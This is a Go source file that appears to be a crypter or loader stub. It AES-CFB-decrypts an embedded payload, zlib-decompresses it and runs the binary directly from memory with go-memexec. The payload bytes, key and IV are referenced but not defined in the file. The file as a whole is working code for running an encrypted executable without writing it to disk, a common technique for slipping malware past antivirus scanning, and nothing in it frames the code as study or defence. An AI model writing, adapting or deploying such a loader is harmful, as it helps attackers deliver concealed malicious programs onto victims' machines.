package main

import (
	"bytes"
	"compress/zlib"
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"github.com/amenzhinsky/go-memexec"
	"io/ioutil"
)


// decompress function
func decompress(input []byte) []byte {
	// read in the compressed data...
	r, err := zlib.NewReader(bytes.NewReader(input))
	if err != nil{
		fmt.Println("[-] zlib.NewReader() Error: ",  err)
	}

	bite, err := ioutil.ReadAll(r)
	if err != nil{
		fmt.Println("[-] ioutil.ReadAll() Error: ", err)
	}

	return bite
}

// decryption function
func decrypt() []byte {
	// creating unencrypted binary array
	unencbin := make([]byte, len(data))

	// creating cipher block
	b, err := aes.NewCipher(key)
	if err != nil{
		fmt.Println("[-] aes.NewCipher() Error: ", err)
	}

	// creating stream cipher
	asd := cipher.NewCFBDecrypter(b, iv)

	// decrypting
	asd.XORKeyStream(unencbin, data)

	return unencbin
}

// execute function
func execute(execfile []byte){
	// create memory execution object
	exe, err := memexec.New(execfile)
	if err != nil {
		fmt.Println("[-] memexec.New() Error: ", err)
	}
	defer exe.Close()

	// prep execute
	r := exe.Command()

	// execute
	b, err := r.CombinedOutput()
	if err != nil {
		fmt.Println("[-] r.CombinedOutput() Error: ", err)
	} else {
		fmt.Println("[+] Executable ran")
	}

	// print any output
	fmt.Println(string(b))

}

// main function
func main() {
	// decrypt binary
	unencrypted := decrypt()

	// decompress binary
	decompressed := decompress(unencrypted)

	// execute binary
	execute(decompressed)
}